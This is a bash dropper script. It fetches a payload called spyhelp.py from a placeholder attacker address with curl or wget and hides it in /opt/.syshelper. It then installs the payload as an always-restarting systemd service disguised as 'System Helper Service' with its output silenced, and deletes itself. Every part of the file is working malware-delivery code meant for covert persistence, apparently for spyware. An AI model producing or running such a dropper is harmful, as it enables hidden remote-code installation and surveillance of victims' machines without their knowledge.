#!/bin/bash
# Dropper - fetches spyhelp.py and installs it as a persistent systemd service

# ─── CONFIG ───────────────────────────────────────────────────────────────────
PAYLOAD_URL="http://YOUR_IP:YOUR_PORT/spyhelp.py"   # Change this when you have hosting sorted
INSTALL_DIR="/opt/.syshelper"
PAYLOAD_NAME="syshelper.py"
SERVICE_NAME="syshelper"
# ──────────────────────────────────────────────────────────────────────────────

# Check for python3
if ! command -v python3 &>/dev/null; then
    echo "[-] python3 not found, exiting."
    exit 1
fi

# Create hidden install directory
mkdir -p "$INSTALL_DIR"

# Download the payload
echo "[*] Fetching payload..."
if command -v curl &>/dev/null; then
    curl -s "$PAYLOAD_URL" -o "$INSTALL_DIR/$PAYLOAD_NAME"
elif command -v wget &>/dev/null; then
    wget -q "$PAYLOAD_URL" -O "$INSTALL_DIR/$PAYLOAD_NAME"
else
    echo "[-] Neither curl nor wget found, exiting."
    exit 1
fi

# Verify download
if [ ! -f "$INSTALL_DIR/$PAYLOAD_NAME" ]; then
    echo "[-] Download failed, exiting."
    exit 1
fi

chmod +x "$INSTALL_DIR/$PAYLOAD_NAME"
echo "[+] Payload installed to $INSTALL_DIR/$PAYLOAD_NAME"

# Install dependencies silently
echo "[*] Installing dependencies..."
python3 -m pip install flask requests --quiet --break-system-packages 2>/dev/null || \
python3 -m pip install flask requests --quiet 2>/dev/null

# Create systemd service
echo "[*] Creating systemd service..."
cat > /etc/systemd/system/$SERVICE_NAME.service <<EOF
[Unit]
Description=System Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 $INSTALL_DIR/$PAYLOAD_NAME
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl daemon-reload
systemctl enable $SERVICE_NAME.service --quiet
systemctl start $SERVICE_NAME.service

# Verify it's running
sleep 2
if systemctl is-active --quiet $SERVICE_NAME; then
    echo "[+] Service is running and persistent across reboots."
else
    echo "[-] Service failed to start. Check: journalctl -u $SERVICE_NAME"
fi

# Clean up dropper
echo "[*] Cleaning up..."
rm -- "$0"
echo "[+] Done."
